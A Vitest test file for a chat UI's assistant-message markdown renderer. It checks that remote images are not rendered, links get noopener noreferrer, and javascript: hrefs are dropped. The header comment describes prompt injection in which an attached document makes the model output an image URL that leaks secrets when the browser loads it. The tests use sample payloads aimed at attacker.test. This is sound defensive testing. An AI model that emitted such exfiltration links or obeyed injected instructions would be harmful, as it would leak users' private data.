import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import Markdown, { type Options } from "react-markdown";

/** An assistant message is model output, and model output repeats what an
 *  attached document told it to say. `![](https://host/?d=secret)` is the
 *  exfiltration path that needs no tool call and no click: the browser fetches
 *  the URL as the line paints. These pin the containment in
 *  components/thread.tsx, which is the props it hands the markdown primitive.
 *
 *  The primitive itself reads its text from assistant-ui's message-part
 *  context and takes no text prop, so it is shimmed onto react-markdown — the
 *  same parser it wraps — and everything under test (the components map, the
 *  URL sanitizer) is the real code. */

const MARKDOWN = vi.hoisted(() => ({ text: "" }));

vi.mock("@assistant-ui/react-markdown", () => ({
  MarkdownTextPrimitive: (props: Options & { className?: string }) => {
    // className is the primitive's own prop, and react-markdown asserts
    // against it — the shim drops it so the parser sees only what it defines
    const parserProps = { ...props };
    delete parserProps.className;
    return <Markdown {...parserProps}>{MARKDOWN.text}</Markdown>;
  },
}));

import { MarkdownText } from "@/components/thread";

function renderMarkdown(text: string) {
  MARKDOWN.text = text;
  return render(<MarkdownText />).container;
}

describe("assistant markdown containment", () => {
  it("renders no img element for a remote image", () => {
    const container = renderMarkdown(
      "![](https://attacker.test/x?d=private-decision-text)",
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("shows the reference so a reader can see what was withheld", () => {
    renderMarkdown("![chart](https://attacker.test/x?d=leak)");
    expect(
      screen.getByText(/chart \(image: https:\/\/attacker\.test\/x\?d=leak\)/),
    ).toBeTruthy();
  });

  it("gives a link no handle back to this tab", () => {
    const container = renderMarkdown("[docs](https://example.test/docs)");
    const link = container.querySelector("a");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link?.getAttribute("href")).toBe("https://example.test/docs");
  });

  it("drops a javascript: href", () => {
    const container = renderMarkdown("[run](javascript:alert(1))");
    expect(container.querySelector("a")?.getAttribute("href")).toBe("");
  });
});
